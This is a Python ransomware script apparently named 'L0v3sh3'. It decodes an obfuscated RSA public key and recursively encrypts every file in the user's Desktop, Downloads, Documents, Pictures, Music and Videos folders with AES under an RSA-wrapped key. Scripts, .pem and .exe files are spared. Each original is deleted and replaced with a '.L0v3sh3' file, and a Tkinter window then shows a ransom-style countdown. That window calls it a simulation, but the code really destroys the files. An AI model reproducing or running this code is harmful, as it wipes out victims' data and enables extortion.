import base64
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import tkinter as tk

# Public key obfuscated
_a = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxZUs0TkppUGlaQ1o0aDRwM2lzNwpyOTdTRGRnaWtrckswNE1sc3oraHY2UmIxKzB2M1hsY296QXVGeGIvMjkxTE5tNGs1M1RZTXQ4M3BPRm9ZRTh4Ckx0VE55UVNSMDR2dzBGcGRwU3Y1YVVjbysxRmtwRjRMdCtqV1Q0YjVrTUFqWTRkOW5Yb3lRQmxJbzBWckMwQzIKcldpeklONGV1TXBTbll3V2Z0a2JsZE5qcDJ1U0hFeWM1Z0FZR1ZKSWZ6TVRiaUxZd0k5aU9rNllnWEozbWJLdAp1dHo2WlRTdlplVzEwaUhrc2JXUXgvcUVjR0JLWFJUbkUvYTJkZVhvRThRaFZOTUV5Z0xVQmF3NERYaWRCbXBiCnFmSWtvZk5UWlQ3K2NyaENocVptYmFrSjA5bTdmT3k1TURud0oraU0wdlBheW1tdGduWnBrR0NQNlpDVDlkeHoKcHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
_a = base64.b64decode(_a)

# Target directories
_b = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Downloads"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Pictures"),
    os.path.expanduser("~/Music"),
    os.path.expanduser("~/Videos")
]

def _scanRec(base):
    '''
    Recursively scan a directory and yield all files.
    '''
    try:
        for entry in os.scandir(base):
            if entry.is_file():
                yield entry
            elif entry.is_dir():
                yield from _scanRec(entry.path)
    except (PermissionError, FileNotFoundError) as e:
        print(f"Skipping {base}: {e}")

def _enc(dataFile, pubKey):
    '''
    Encrypt a file using RSA for the session key and AES for the data.
    '''
    ext = dataFile.suffix.lower()
    dataFile = str(dataFile)
    
    try:
        with open(dataFile, 'rb') as f:
            data = f.read()

        key = RSA.import_key(pubKey)
        sessionKey = os.urandom(16)

        cipher = PKCS1_OAEP.new(key)
        encryptedSessionKey = cipher.encrypt(sessionKey)

        cipher = AES.new(sessionKey, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        fileName = dataFile.split(ext)[0]
        encryptedFile = fileName + ext + '.L0v3sh3'
        with open(encryptedFile, 'wb') as f:
            [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
        
        os.remove(dataFile)
        print(f"Encrypted: {dataFile} -> {encryptedFile}")

    except Exception as e:
        print(f"Failed to encrypt {dataFile}: {e}")

for directory in _b:
    if os.path.exists(directory):
        print(f"Scanning directory: {directory}")
        for item in _scanRec(directory):
            filePath = Path(item)
            fileType = filePath.suffix.lower()

            excludeExtension = ['.py', '.pem', '.exe']
            if fileType in excludeExtension:
                continue

            _enc(filePath, _a)

def _countdown(count):
    '''
    Countdown timer for the ransomware GUI.
    '''
    hour, minute, second = map(int, count.split(':'))
    _label['text'] = f'{hour:02}:{minute:02}:{second:02}'

    if hour > 0 or minute > 0 or second > 0:
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        _root.after(1000, _countdown, f'{hour}:{minute}:{second}')

_root = tk.Tk()
_root.title('L0v3sh3 Ransomware')
_root.geometry('500x300')
_root.resizable(False, False)

_label1 = tk.Label(_root, text="Your data has been encrypted!\nThis is just a simulation.\n\n", font=('calibri', 12, 'bold'))
_label1.pack()

_label = tk.Label(_root, font=('calibri', 50, 'bold'), fg='white', bg='blue')
_label.pack()

_countdown('01:30:00')

_root.mainloop()
